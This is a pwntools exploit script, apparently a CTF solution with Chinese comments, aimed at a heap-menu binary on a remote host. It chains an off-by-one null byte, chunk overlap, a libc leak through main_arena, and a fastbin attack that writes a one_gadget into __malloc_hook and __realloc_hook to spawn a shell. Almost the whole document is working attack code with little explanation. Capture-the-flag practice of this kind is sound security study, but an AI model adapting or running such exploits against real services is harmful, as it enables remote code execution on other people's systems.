#coding:utf8
from pwn import *
from one_gadget import *
context.log_level = 'debug'
# sh = process('./timu')
sh = remote('159.138.137.79',52867)
libc_path = 'libc-2.23.so'
libc = ELF(libc_path)
#malloc_hook 的静态地址
malloc_s_hook = libc.symbols['__malloc_hook']
#realloc 函数的静态地址
realloc_s = libc.sym['realloc']
#gadger
# g = generate_one_gadget(libc_path)
gadget = 0x3a80e

 #sh = remote('111.198.29.45',41803)

def create(size,content):
    sh.sendlineafter('Your choice :\n','1')
    sh.sendlineafter('Size:',str(size))
    sh.sendafter('Data:',content)

def delete(index):
    sh.sendlineafter('Your choice :\n','2')
    sh.sendlineafter('Index:',str(index))

def show():
    sh.sendlineafter('Your choice :\n','3')
#chunk0
create(0x100,'a'*0x100)
 #chunk1
create(0x100,'b'*0x100)
#chunk2
create(0x68,'c'*0x68)
#chunk3
create(0x68,'d'*0x68)
#chunk4
#特别！！chunk4 后面 0x10 空间用于伪装假 chunk5
create(0x100,'e'*(0x100-16) + p64(0x100) + p64(0x11))
#chunk2 用于放入 fastbin
delete(2)
#chunk3 用于溢出
delete(3)
#chunk0 用于加入 unsorted bin，并且让 main_arena+88 指针存入 fd 和 bk
delete(0)
#把 chunk3 申请回来，并 off by one null 到 chunk4,覆盖 chunk4 的低 1 字节为 0
payload = 'e'*0x60
#prev_size
payload += p64(0x300)
create(0x68,payload)
#0、1、2、3、4 堆块合并
delete(4)
#申请掉 chunk0 后，main_area+88 指针放到了 chunk1 的 fd 和 bk 处
create(0x100,'a'*0x100)
show()
sh.recvuntil('1 : ')
main_area_88 = u64(sh.recvuntil(' ').split(' ')[0].ljust(8,'\x00'))
#低字节替换获得 malloc_hook 的地址
malloc_hook_addr = (main_area_88 & 0xFFFFFFFFFFFFF000) + (malloc_s_hook & 0xFFF)
libc_base = malloc_hook_addr - malloc_s_hook
realloc_addr = libc_base + realloc_s
gadget_addr = libc_base + gadget
print 'malloc_hook_addr=',hex(malloc_hook_addr)
print 'realloc_addr=',hex(realloc_addr)
print 'gadget_addr=',hex(gadget_addr)
#现在用 fastbin attack
#堆重叠，修改 chunk2 的 fd 指针
payload = 'g'*0x100
payload += p64(0) + p64(0x71)
payload += p64(malloc_hook_addr-0x23)
create(0x118,payload)

#第一次申请
create(0x68,'h'*0x68)
#修改 realloc_hook 和 malloc_hook
payload = '\x00' * 0xB + p64(gadget_addr) + '\x00'*(0x13-0xB-0x8)
#用于堆栈调整
payload += p64(realloc_addr + 2)
payload += '\n'
#第二次申请
create(0x68,payload)
#触发 malloc_hook getshell
sh.sendlineafter('Your choice :\n','1')
sh.sendlineafter('Size:','1')
sh.interactive()